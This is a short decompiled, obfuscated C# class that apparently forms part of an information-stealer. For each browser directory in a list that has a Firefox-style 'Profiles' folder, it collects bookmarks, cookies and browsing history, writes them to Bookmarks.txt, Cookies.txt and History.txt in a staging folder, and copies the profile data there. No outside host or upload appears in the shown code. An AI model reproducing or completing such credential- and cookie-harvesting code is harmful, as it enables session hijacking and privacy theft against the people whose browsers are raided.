using System;
using System.Collections.Generic;
using System.IO;
using ns13;
using ns8;

namespace ns10;

internal sealed class Class36
{
	public static void smethod_0(string string_0)
	{
		string[] string_ = Class56.string_1;
		foreach (string text in string_)
		{
			try
			{
				string name = new DirectoryInfo(text).Name;
				string text2 = string_0 + "\\" + name;
				if (Directory.Exists(Class56.string_3 + text + "\\Profiles"))
				{
					Directory.CreateDirectory(text2);
					List<Struct6> list_ = Class34.smethod_1(Class56.string_3 + text);
					List<Struct2> list_2 = Class35.smethod_1(Class56.string_3 + text);
					List<Struct5> list_3 = Class37.smethod_1(Class56.string_3 + text);
					Class31.smethod_9(list_, text2 + "\\Bookmarks.txt");
					Class31.smethod_6(list_2, text2 + "\\Cookies.txt");
					Class31.smethod_8(list_3, text2 + "\\History.txt");
					Class38.smethod_1(Class56.string_3 + text + "\\Profiles\\", text2);
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
	}
}
